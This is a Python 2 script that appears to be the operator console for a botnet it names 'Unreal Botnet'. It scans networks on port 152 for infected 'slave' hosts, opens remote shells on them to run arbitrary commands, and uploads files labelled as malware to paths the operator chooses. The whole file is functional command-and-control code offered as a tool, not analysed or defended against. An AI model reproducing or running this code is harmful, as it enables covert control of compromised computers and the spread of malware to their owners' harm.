#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import sys
import subprocess
import ipaddress
import time

def Scan():
	print '1. Scan all\n2. Scan only one'
	c = raw_input('>')
	if len(c) == 0: sys.exit(0)
	elif c == '1':
		Slaves = []
		print 'Address: [Ex: 192.168.1.0/24'
		hostin = raw_input('>')
		if len(hostin) == 0: sys.exit(0)
		ip_net = ipaddress.ip_network(unicode(hostin))
		all_hosts = list(ip_net.hosts())
		for i in range(len(all_hosts)):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				result = s.connect_ex((str(all_hosts[i]), 152))
				if result == 0:
					Slaves.append(str(all_hosts[i]))
				else:
					pass
			except socket.error as e :
				print e
			except KeyboardInterrupt:
				print 'You pressed Ctrl+C'
				sys.exit(0)
		print str(Slaves)
	elif c == '2':
		Slaves = []
		print 'Host Address'
		host = raw_input('>')
		if len(host) == 0: sys.exit(0)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = s.connect_ex((host, 152))
			if result == 0:
				Slaves.append(host)
				print "-" * 15
				print '|' +str(Slaves)+'|'
				print '-' * 15
			else:
				print 'Host without the Unreal Botnet'
		except KeyboardInterrupt:
			print 'You pressed Ctrl+C'
			sys.exit(0)
		except socket.error as e:
			print e
def control(host, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect((host, int(port)))
	subprocess.call('clear', shell=True)
	print 'Connected!'
	print '1. Return the Shell\n2. Close Connection\n3. Remove [X]\n4. Send a Malware\n5. Exit'
	s = raw_input('>')
	if len(s) == 0: sys.exit(0)
	elif s == '1':
		while True:
			cmd = raw_input('>')
			if len(cmd) == 0: print 'Not Empty'
			if cmd[:5] == 'where':
				sock.send('whereis')
				d = sock.recv(1024)
				print d
				d = ''
			elif cmd[:3] == 'cd ':
				sock.send(cmd)
				while True:
					bd = sock.recv(1024)
					print bd
					bd = ''
					break
			else:
				if cmd[:5] == '.exit':
					sock.send('rexit')
					break
				else:
					sock.send(cmd)
					while True:
						data = sock.recv(1024)
						print data
						data = ''
						break
	elif s == '2':
		sock.close()
		print 'Closed.'
		main()
	elif s == '3':
		sock.send('rootexit')
		print 'Removed'
		main()
	elif s == '4':
		sock.send('sendfile')
		data = sock.recv(1024)
		if data[:6] == 'ready':
			path = raw_input('PATH>')
			spath = raw_input('PATH TO>')
			f = open(path, 'rb')
			sock.send(spath)
			print 'Sending..'
			l = f.read(1024)
			while (l):
				sock.send(l)
				l = f.read(1024)
			f.close()
			print 'Done..'
			time.sleep(1)
			sock.close()
			main()
def main():
	while True:
		print '1. Connect\n2. Scan for slaves\n3.Exit'
		r = raw_input('>')
		if len(r) == 0: break
		elif r == '1':
			h = raw_input('>')
			if len(h) == 0: break
			p = raw_input('>')
			if len(p) == 0: break
			control(h, p)
		elif r == '2':
			Scan()
		elif r == '3':
			sys.exit(0)
main()
